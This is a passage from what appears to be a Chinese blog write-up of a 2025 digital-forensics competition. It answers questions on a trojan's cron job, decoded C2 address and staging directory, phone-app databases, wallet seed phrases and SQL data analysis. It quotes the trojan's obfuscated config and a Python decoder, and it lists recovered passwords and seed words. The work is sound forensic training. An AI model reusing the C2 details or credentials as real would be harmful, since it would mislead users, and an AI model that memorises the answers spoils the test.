+所以我们可以推断这个是送到了我们185.199.108.153:443上去（这也就是第72的答案）
+而本题的答案其实就在后边（你怎么藏那么深！！）
+我们拖动进度条就能看到，这个木马的进程号就是2177
+70、分析物联网检材，系统中存在一个非标定时任务，这个任务每隔多少分钟执行？（答案格式：1）（ ）
+详情思路可以看69的叙述，我们在放定时任务的地方看到了一个长的奇奇怪怪的，大概就是它/etc/cron.d/healthcheck
+这个10单位就是分钟
+所以答案就是10
+71、分析物联网检材，木马程序会窃取文档暂存在隐藏目录，这个目录的绝对路径？（/root/root/）（ ）
+绝对路径其实也能分析木马程序得到，但是需要解密
+我们已经知道了木马程序，并且知道了
+C2_SERVER==185.199.108.153
+C2_PORT==443
+C2_SERVER = “zUTMugDMx4SO5EjL1gTM”
+C2_PORT = “zQDN”
+因此我们可以推测出加密手段
+其实算一下就会发现443的base64就是NDQz，恰好是加密的反向
+185.199.108.153也是如此
+直接让ai跑吧，ai会发现是Base64编码+字符串反转
+写一个交互式的解密代码
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+#!/usr/bin/python3
+# -
+*- coding: utf-8 -*
+-
+import base64
+def decrypt
+_config(encrypted_
+text):
+"""
+解密配置参数
+加密方式：Base64编码后反转字符串
+解密方式：先反转字符串，再Base64解码
+"""
+try:
+# 1. 先反转字符串
+reversed_text = encrypted_text[::-1]
+# 2. 再进行Base64解码
+# 处理可能存在的填充问题
+missing_padding = len(reversed_text) % 4
+if missing_padding:
+reversed_text += '=' * (4 - missing_padding)
+decoded_bytes = base64.b64decode(reversed_text)
+decrypted_text = decoded_bytes.decode('utf-8')
+return decrypted_text
+except Exception as e:
+return f"解密失败: {e}"
+def batch
+_decrypt():
+"""批量解密脚本中的所有配置变量"""
+# 已知的密文配置
+configs = {
+'C2_
+SERVER': 'zUTMugDMx4SO5EjL1gTM',
+'C2_PORT': 'zQDN',
+'SPOOL_DIR': 'GJTJzBXdjZkMlw2bvB3cGJTJyFmdGJTJ',
+'STAGING_DIR': 'GJTJlh2YhNmLGJTJw1GdGJTJ',
+'LOG_FILE': '==wZvxmLkF2bsBXdGJTJlJXYoNnRyUCbhN2bs5iRyUCdv9mcGJTJ',
+'WATCHED_KEYWORD': '=UmcpZmbvdWYyREMyUCdjVmavJHU'
+}
+print("开始解密配置参数...")
+print("=" * 50)
+for key, encrypted in configs.items():
+decrypted = decrypt_config(encrypted)
+print(f"{key}:")
+print(f"  密文: {encrypted}")
+print(f"  明文: {decrypted}")
+print("-" * 30)
+def interactive
+_decrypt():
+"""交互式解密模式"""
+print("\n交互式解密模式（输入q退出）")
+print("=" * 30)
+while True:
+encrypted_
+input = input("请输入要解密的密文: ").strip()
+if encrypted_input.lower() == 'q':
+break
+if not encrypted_input:
+continue
+result = decrypt_config(encrypted_input)
+print(f"解密结果: {result}")
+print("-" * 30)
+if
+__name__
+== "
+__main__
+":
+# 批量解密已知配置
+batch_decrypt()
+# 进入交互式模式
+interactive_decrypt()
+就是/tmp/.cache
+所以这一题就是这个
+说起来啊。。。如果解密头上的那个
+会得到提示，就是URL编码-base64-字符串反转而已。。
+其实不用那么复杂的
+72、分析物联网检材，木马程序将数据上传到的服务器的IP地址是多少？（答案格式：1.1.1.1）（ ）
+根据上文我们找到的，我们可以确定这个木马存在着窃取行为，会放到C2去
+在火眼就能看出来就是185.199.108.153
+73、根据木马程序，它监视的关键字是什么？（答案格式：按照实际情况填写）（ ）
+就写在这个木马程序里
+跟71是一样的
+解密完就得到了是Project Dragonfire
+七、移动终端取证分析
+74、分析检材中微信ID:wxid_f4s0jmpvrc522对应的手机号后四位为（答案格式：1111）（ ）
+可以看到本ID的手机号如图
+所以后4位就是8390
+75、分析检材中“华为应用市场”第一次安装日期为（使用双位数格式，答案格式：01月01日）（ ）
+2025-09-24 19:37:42
+所以是09月24日
+76、找出检材中钱包APP，请列出该APP中ETH地址后六位是（字母全大写，答案格式：AAAAAA）（ ）
+在imToken这个钱包软件里可以看到
+0x304fEd2927f47692E50158A1148a1B65503FE61F
+后六位为3FE61F
+77、分析出检材中包含“南昌西站”的图片，计算该图片的MD5后六位？（字母全大写，答案格式：AAAAAA）（ ）
+在图片分类里我们很快就能定位到这样子一张有着“南昌西站”字样的图片
+25DEF5E31002F14894ADEF17D585A51D
+所以后六位是85A51D
+78、手机相册中有张“imtoken助记词1.PNG”图片被破坏，请修复该图片，列出该图片中第三个单词。（答案格式：按照实际情况填写）（ ）
+直接索引搜索就能找到，是一张损坏的图片
+这边很像是坏了宽高的
+我们扔到随波逐流修复一下
+一把梭
+所以第三个单词就是boost
+79、找出一张PNG图片，该图片上显示“助记词2”，请列出该图片上显示的第二个单词。（答案格式：按照实际情况填写）（ ）
+依旧索引，这次直接有了
+是delay
+80、找出检材中显示“助记词3”的文档，列出该文档中记录的第三个助记词单词。（答案格式：按照实际情况填写）（ ）
+搜索助记词3才蹦出来，这边可以看到蹦出来了一个student
+藏在这边了
+这有个上锁的
+噢可以看到是个word，但是搜了很久都没找到
+这边还是想到了之前有个student，那我们直接暴搜看看，最后发现藏在了文件末，还好火眼给我蹦出来个student
+81、分析出该组助记词正常顺序中最后一个单词（已知助记词1、助记词2、助记词3中的单词顺序有被调整）。（答案格式：按照实际情况填写）（ ）
+助记词1：movie,unlock,boost,segment
+助记词2：foil,delay,paddle,obtain
+助记词3：student,electric,quarter,clerk
+但是是什么，还是没有头绪，我们主要是不知道这个应该输入到哪
+如果知道了就能直接爆破了
+这边的提示是用助记词恢复btcrecover，但是这玩意是需要python3.9的，别的都会报错
+其实这边可以用川佬的小工具
+https://github.com/WXjzcccc/recoverMnemonic
+欸啊我去了，这也太夯了
+所以最后的助记词是segment
+82、分析出邮箱中收件人QQ号为“850563586”的姓名（答案格式：按照实际情况填写）（ ）
+一把梭了
+是刘佳雨
+83、得知机主通过某个应用给HHshAL发送了一个文档，该应用的数据包名是什么？（答案格式：com.test）（ ）
+我从头到尾都没在这边找到什么HHshAL
+看了wp才知道，我们在该包的database路径下找到的那个dingtong.db并没有找错，只是我们打开的方式不对，无论是navicat还是vc都打不开
+因为这玩意是加密数据库（我还以为坏了呢）
+要这玩意才能打开，所以我们先下一个
+这个数据库就是这样子一个加密的数据库
+所以我们需要先去对这个apk进行分析，找出其密码，而后再进行解密，查看dingtong.db
+（这个密码其实就是下一题的答案）
+先找主入口
+然后进去看看
+这边我们可以找到onCreate部分，我们去这边看看
+在com.example.dingtong.Myapplication.onCreate()里我们可以看到对于这个加密数据库的使用情况
+通过分析，这个参数很有可能就是加密密码
+定位过去，我们成功找到了数据库打开的密码，也就是第84的答案
+@1@#!aajsk1*JKJ
+我们前去DB Browser打开
+选择SQLCipher3
+这边就可以看到数据库内部数据了
+在这边我们成功找到了HHshAL这位关键人员
+这边也可以看到机主通过某个应用给HHshAL发送了一个文档
+因此本题的答案就是这个软件的包名dingtong.saichuang
+84、接上题，该应用聊天记录数据库的打开密码是什么？（答案格式：按照实际情况填写）（ ）
+做题步骤在83题中
+@1@#!aajsk1*JKJ
+85、接上题，机主发送的这个加密文档，打开密码是什么？（答案格式：按照实际情况填写）（ ）
+在83题文件发完的下一句就是密码
+一眼摩斯密码
+–.-/.–/./.-./-/-…./-…./-…./
+所以就是QWERT666
+86、厉明的身份证地址登记的门牌号是多少？？（答案格式：1）（ ）
+手机做到这边基本上就是各种apk的数据库分析了
+我们在APK列表里可以看见这样子一位，一眼就很重要但是到现在还没被用过的软件
+因此我们对此展开调查
+定位到内容文件的数据库还是蛮方便的
+进去就看见个Password
+然后是两个文件对应的密码
+这边题目问身份证，那我们就打开这个身份证文件
+bwX2ZEfE9就是密码
+打开都不用筛查，这边其实复杂一些可以OCR然后筛查？
+总之就一张
+所以家在722号，得解
+87、分析出“important1.xlsx”文件中体现的“金达欣”银行卡后六位？（答案格式：111111）（ ）
+上一题我们也找到了这个important1.xlsx的密码3;s=]-
+而这个文件在找助记词3的时候就一起带出来了
+很容易就找到了，找到之后的后六位就是935629
+[?]88、接上题，保存“important1.xlsx”打开密码数据的应用，该应用的启动密码是什么？（答案格式：按照实际情况填写）（ ）
+这个应用我们知道了就是那个密信，但是干在火眼分析中什么都找不到启动密码
+所以我们考虑仿真一下，然后利用MT来替换数据库，最后看看
+我们将
+C:\hlnet\3-1761962929\data\data\com.android.mxt文件包直接复制粘贴进C:\Users\用户名\Documents\leidian9\Pictures
+然后去模拟器的中复制 接下来去mt里面的左侧，进入/storage/emulated/0/Pictures/（这是雷电的共享目录），右侧就是data/data 长按复制（注意这边右边一定要是data才行）
+可以把安装包也扔到共享目录
+然后直接先下，下完之后替换内容文件就好了
+先安装，然后再替换，看到下边算是成功了
+好我们打开来看看怎么样
+如果我们没有替换的话，这边会显示的是让我们注册一个，但是替换之后就不用了
+我们在电脑里找半天是知道了肯定没有所谓的密码的，因此我们这边只能点忘记密码
+而这个密保正好有一个在问身份证后六位，别的不知道，身份证还不知道吗，这不是86刚刚问过身份证吗
+所以我们填入30836X
+（这边蛮神奇的我第一次仿真失败了，但是第二次成功了，上边那些图都是我的，但是我输入了身份证又出不来，后边再删了想重新仿真就仿不了开始闪退了，奇了怪了）
+按照406的wp，最后会找回密码是1111
+这边好像不是这样子做的，先打个问号存疑一下，好像要分析程序内部，有点复杂的，答案是1596
+火眼也罢工了，唉，以后再做吧
+八、数据分析
+ai神力显现部分，复盘也就是再扔给ai一遍，先就不复盘了，写个答案
+89、通过对检材“01-lott.sql”文件进行分析，统计庄家”188”在2021-05-10当日的电子投注总笔数（答案格式：1）（ ）
+2299
+90、通过对检材“01-lott.sql”文件进行分析，统计t_trade_betrecord中庄家”188”记录中彩票类型为”jnd28”且期号在t_lottery_jnd表中存在的记录数。（答案格式：1）（ ）
+92842
+91、通过对检材“01-lott.sql”文件进行分析，统计庄家”188”的玩家在2021-05-10当日：电子投注内容出现频率最高的电子投注内容是什么？（答案格式：按照实际情况填写）（ ）
+500单
+92、通过对检材“01-lott.sql”文件进行分析，关联t_trade_betrecord与t_lottery_jnd表，分析庄家”188”在2021-05-10投注”jnd28”时：当开奖结果为”大”时，玩家投注包含”小”的笔数占比（使用双位数格式，答案格式：11.11%）（ ）
+44.88%
+93、通过对检材“02-crime_records.sql”分析，统计相邻两次作案时间间隔在1天之内的城市和该城市两次作案时间间隔在1天之内的案件总数量，找出案件总数最多的城市名。（答案格式：按照实际情况填写）（ ）
+福州
+94、通过对检材“02-crime_records.sql”分析，根据案件的损失金额和伤情等级，将案件分为 “轻微案件”“一般案件”“重大案件”“其他”四类（分类规则如下），并统计 2023 年各类型案件的数量。轻微案件：损失金额≤10000 元且无人员受伤（injury_level 为空或未提及）；一般案件：损失金额 10001-50000 元，或有轻微伤；重大案件：损失金额 > 50000 元，或有轻伤或有重伤；其他：非上述情况。（按照案件数量的降序输出答案，答案格式为：40/30/20/10）（ ）
+15712/2058/1985/222
+95、通过对检材“02-crime_records.sql”分析，统计 2021-2023 年期间（含2021年和2023年），每年处理结果为 “移送起诉” 的案件里，每一年中损失总额最高的案件类型对应的损失总额为？（按 2021 - 2023 年顺序连接损失总额，连接符号使用/,小数点保留2位，答案格式为 ：1.37/2.21/3.45）（ ）
+325806042.91/344804883.98/352132431.37
+96、通过对检材“03-案件卡串号数据”表分析，该表每条数据的“卡串号(IMSI)”字段值存在问题，不可信。真实可信的卡串号值在“溯源”字段中（溯源字段的值格式均为“{手机号=[待获取的卡串号->手机卡串号(IMSI)使用过的手机号->当前]}”），请统计分析出该表中哪个真实卡串号出现过的次数最多？（答案格式：按照实际情况填写）（ ）
+460017709683511
+97、通过对检材“04-涉诈案件信息表“分析，统计每个分局2024-2025年每月被骗总额环比大于30%的月份个数（环比定义：（这个月的数据-上个月的数据）/上个月数据。特殊情况，例如某分局2025年1月被骗金额总和为100，若该分局2024年12月没有被骗金额，则该分局2025年1月也符合题目要求，应增加一个月份。2024年1月不需要计算与上个月的环比情况），请写出环比大于30%的月份个数最多的分局ID名称为？（答案格式：按照实际情况填写）（ ）
+A675
+98、通过对检材“05-人像卡口信息表”和“06-涉毒前科人员信息表”（两表均无重复数据，直接要求答题即可。感知时间字段格式均为yyyy-MM-dd HH:mm:ss；传感器ID（人像卡口点位）值不同则代表不同的摄像点位），为摸排疑似涉毒的窝点，请分析出在00:00:00~06:00:00(含0点跟6点)人像记录中，哪个传感器点位ID抓拍到最多的不同涉毒前科人员？（答案格式：按照实际情况填写）（ ）
+350203103
+99、接上题，为摸排潜在的涉毒人员，请分析出有多少个非涉毒前科人员至少跟3个不同的涉毒前科人员同行过？（本题的“同行”指：两人在同一个人像卡口点位感知时间差在10（含）秒内）（答案格式：1）（ ）
+4
+100、近几年架设简易GOIP设备进行群呼诈骗的案件屡见不鲜。架设和维护该设备的人员通常会频繁更换酒店【即只住一天然后更换酒店】以此躲避公安的侦察打击。请根据”07-旅店住宿信息表“（该表无重复数据，直接要求答题即可。时间相关的字段格式均为yyyy-MM-dd HH:mm:ss），筛选出2024和2025年的住宿记录（以“入住时间”为准），频繁更换酒店的人员有几个？（答案格式：1）（ ）
+7
+电子取证
+#Misc
+#Mobile
+#Crypto
+#Reverse
+2025数证杯初赛
+https://mei-you-qian.github.io/2025/11/05/2025数证杯初赛/
+作者
+Meiyouqian
+发布于
+2025年11月5日
+许可协议
+2024美亚杯个人赛
+上一篇
+2025SWPU-NSSCTF
+下一篇
